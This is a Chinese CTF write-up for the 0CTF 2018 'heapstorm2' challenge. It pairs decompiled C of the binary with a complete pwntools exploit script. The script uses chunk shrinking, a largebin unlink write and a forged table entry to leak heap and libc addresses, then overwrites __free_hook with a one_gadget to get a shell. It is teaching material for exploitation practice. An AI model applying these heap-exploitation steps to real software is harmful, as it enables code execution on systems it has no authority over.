# 0CTF2018 heapstorm2
## Author: Wenhuo
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>0CTF的题大多都是有些难度的，先放一个[大佬](https://eternalsakura13.com/2018/04/03/heapstorm2/)+[另一份](https://blog.csdn.net/weixin_40850881/article/details/80293143)可以参考的博客，讲的很详细，这题要点就在利用了largebin的unlink来向mmap的内存写入地址，并利用地址的偏移巧妙地得到一个值可以绕过新分配的堆块的size检查，然后就可以任意数据的写入读出了。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>首先用IDA照常看一下程序的逻辑:</font></br>

**main**
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  _QWORD *mmap_mem; // [rsp+8h] [rbp-8h]

  mmap_mem = (_QWORD *)mmap_chunk();
  while ( 1 )
  {
    menu();
    get_choose();
    switch ( (unsigned __int64)choose )
    {
      case 1uLL:
        alloc((__int64)mmap_mem);
        break;
      case 2uLL:
        update(mmap_mem);
        break;
      case 3uLL:
        delete(mmap_mem);
        break;
      case 4uLL:
        view(mmap_mem);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

**mmap_chunk**
```C
signed __int64 mmap_chunk()
{
  signed int i; // [rsp+8h] [rbp-18h]
  int fd; // [rsp+Ch] [rbp-14h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  alarm(0x3Cu);
  puts(
    "    __ __ _____________   __   __    ___    ____\n"
    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
    "  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"
    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"
    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");
  puts("===== HEAP STORM II =====");
  if ( !mallopt(1, 0) )
    exit(-1);
  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
    exit(-1);
  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )
    exit(-1);
  close(fd);
  MEMORY[0x13370818] = MEMORY[0x13370810];
  for ( i = 0; i <= 15; ++i )
  {
    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = get_mem_chunk((_QWORD *)0x13370800, 0LL);
    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = get_mem_size(0x13370800LL, 0LL);
  }
  return 0x13370800LL;
}
```

**get_mem_chunk**
```C
__int64 __fastcall get_mem_chunk(_QWORD *a1, __int64 a2)
{
  return *a1 ^ a2;
}
```

**get_mem_size**
```C
__int64 __fastcall get_mem_size(__int64 a1, __int64 a2)
{
  return a2 ^ *(_QWORD *)(a1 + 8);
}
```

**alloc**
```C
void __fastcall alloc(__int64 mmap_mem)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int size; // [rsp+14h] [rbp-Ch]
  void *chunk; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !get_mem_size(mmap_mem, *(_QWORD *)(16 * (i + 2LL) + mmap_mem + 8)) )
    {
      printf("Size: ");
      size = get_choose();
      if ( size > 0xC && size <= 0x1000 )
      {
        chunk = calloc(size, 1uLL);
        if ( !chunk )
          exit(-1);
        *(_QWORD *)(16 * (i + 2LL) + mmap_mem + 8) = get_mem_size(mmap_mem, size);
        *(_QWORD *)(16 * (i + 2LL) + mmap_mem) = get_mem_chunk((_QWORD *)mmap_mem, (__int64)chunk);
        printf("Chunk %d Allocated\n", (unsigned int)i);
      }
      else
      {
        puts("Invalid Size");
      }
      return;
    }
  }
}
```

**update**
```C
int __fastcall update(_QWORD *a1)
{
  __int64 chunk; // ST18_8
  __int64 v3; // rax
  signed int index; // [rsp+10h] [rbp-20h]
  int size; // [rsp+14h] [rbp-1Ch]

  printf("Index: ");
  index = get_choose();
  if ( index < 0 || index > 15 || !get_mem_size((__int64)a1, a1[2 * (index + 2LL) + 1]) )
    return puts("Invalid Index");
  printf("Size: ");
  size = get_choose();
  if ( size <= 0 || size > (unsigned __int64)(get_mem_size((__int64)a1, a1[2 * (index + 2LL) + 1]) - 12) )
    return puts("Invalid Size");
  printf("Content: ");
  chunk = get_mem_chunk(a1, a1[2 * (index + 2LL)]);
  get_content(chunk, size);
  v3 = size + chunk;
  *(_QWORD *)v3 = 'ROTSPAEH';
  *(_DWORD *)(v3 + 8) = 'II_M';
  *(_BYTE *)(v3 + 12) = 0;
  return printf("Chunk %d Updated\n", (unsigned int)index);
}
```

**delete**
```C
int __fastcall delete(_QWORD *mmap_mem)
{
  void *chunk; // rax
  signed int index; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  index = get_choose();
  if ( index < 0 || index > 15 || !get_mem_size((__int64)mmap_mem, mmap_mem[2 * (index + 2LL) + 1]) )
    return puts("Invalid Index");
  chunk = (void *)get_mem_chunk(mmap_mem, mmap_mem[2 * (index + 2LL)]);
  free(chunk);
  mmap_mem[2 * (index + 2LL)] = get_mem_chunk(mmap_mem, 0LL);
  mmap_mem[2 * (index + 2LL) + 1] = get_mem_size((__int64)mmap_mem, 0LL);
  return printf("Chunk %d Deleted\n", (unsigned int)index);
}
```

**view**
```C
int __fastcall view(_QWORD *mmap_mem)
{
  __int64 size; // rbx
  __int64 chunk; // rax
  signed int v4; // [rsp+1Ch] [rbp-14h]

  if ( (mmap_mem[3] ^ mmap_mem[2]) != 0x13377331LL )
    return puts("Permission denied");
  printf("Index: ");
  v4 = get_choose();
  if ( v4 < 0 || v4 > 15 || !get_mem_size((__int64)mmap_mem, mmap_mem[2 * (v4 + 2LL) + 1]) )
    return puts("Invalid Index");
  printf("Chunk[%d]: ", (unsigned int)v4);
  size = get_mem_size((__int64)mmap_mem, mmap_mem[2 * (v4 + 2LL) + 1]);
  chunk = get_mem_chunk(mmap_mem, mmap_mem[2 * (v4 + 2LL)]);
  outout(chunk, size);
  return puts(byte_180A);
}
```


&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>程序比一般的题目稍为繁琐，首先用mmap映射了一块内存作为堆块地址的记录，在首地址开始的0x20空间里放了随机数来异或记录的堆块地址和大小，使用时再次异或得到真实地址，这增加了泄露堆块基址的难度，但问题不大。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>首先我们使用shrink chunk来制造重叠堆块，并以此得到一个unsorted bin，一个largebin：</font></br>

```python
from pwn import *

context.log_level=1

#p=process('./heapstorm2',env={'LD_PRELOAD':'./libc-2.24.so'})
#elf=ELF('./libc-2.24.so')
#one_gadget=0x3f35a

p=process('./heapstorm2')
elf=ELF('/lib/x86_64-linux-gnu/libc.so.6')
one_gadget=0x4526A

sd=lambda x : p.send(x)
sl=lambda x : p.sendline(x)
rv=lambda x : p.recvuntil(x)
sla=lambda a,x : p.sendlineafter(a,x)
sa=lambda a,x : p.sendafter(a,x)

free_hook=elf.symbols['__free_hook']

def alloc(size,):
    sla('Command: ','1')
    sla('Size: ',str(size))

def update(index,content):
    sla('Command: ','2')
    sla('Index: ',str(index))
    sla('Size: ',str(len(content)))
    sla('Content: ',content)

def dele(index):
    sla('Command: ','3')
    sla('Index: ',str(index))

def view(index):
    sla('Command: ','4')
    sla('Index: ',str(index))


alloc(0x18)     # 0
alloc(0x520)    # 1
alloc(0x18)     # 2

alloc(0x18)     # 3
alloc(0x520)    # 4
alloc(0x18)     # 5
alloc(0x18)     # 6

update(1,'a'*0x4f0+p64(0x500))
dele(1)
update(0,'a'*12)
alloc(0x18)     # 1
alloc(0x4d0)    # 7
dele(1)
dele(2)
alloc(0x38)     # 1
alloc(0x500)    # 2

update(4,'a'*0x4f0+p64(0x500))
dele(4)
update(3,'a'*12)
alloc(0x18)     # 4
alloc(0x4d0)    # 8
dele(4)
dele(5)
alloc(0x48)     # 4
#alloc(0x4f0)   

dele(2)
alloc(0x500)    # 2
dele(2)


```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>原理不多解释了，how2pwn里有demo，大佬的博客也解释的十分清楚明白。然后我们伪造unsortedbin的bk和largebin的bk和bk_nextsize，利用largebin的unlink（bk->bk_nextsize->fd_nextsize=victim）把自身堆块的地址写到任意地址去，我们可以把这个地址写到mmap上去，这样分配堆块时只要堆块的地址合适，根据堆地址的最高字节0x55或**0x56**我们就可以绕过size检查，成功把堆块分配到堆表上，然后随意控制读写。</font></br>

```python
addr=0x13370000+0x800-0x20
update(7,p64(0)*3+p64(0x511)+p64(0)+p64(addr))
update(8,p64(0)*5+p64(0x501)+p64(0)+p64(addr+8)+p64(0)+p64(addr-0x18-5))

# 因为PIE，一旦堆地址0x56开头，就可以绕过size检查
# 这次分配就能够成功，然后就可以为所欲为
alloc(0x48)     # 2

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>剩下的就随便改了，不多讲：</font></br>

```python
update(2,p64(0)*5+p64(0x13377331)+p64(addr+0x20+0x30))
update(0,p64(addr+3)+p64(8))
view(1)

rv('Chunk[1]: ')
chunk_base=u64(p.recv(6)+2*'\x00')-0x60
log.info('chunk base is:'+hex(chunk_base))

update(0,p64(chunk_base+0x70)+p64(8))
view(1)
rv('Chunk[1]: ')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4b78
log.info('libc base is:'+hex(libc_base))

gdb.attach(p)
update(0,p64(libc_base+free_hook)+p64(8))
update(1,p64(libc_base+one_gadget)+p64(8))

dele(4)

p.interactive()


```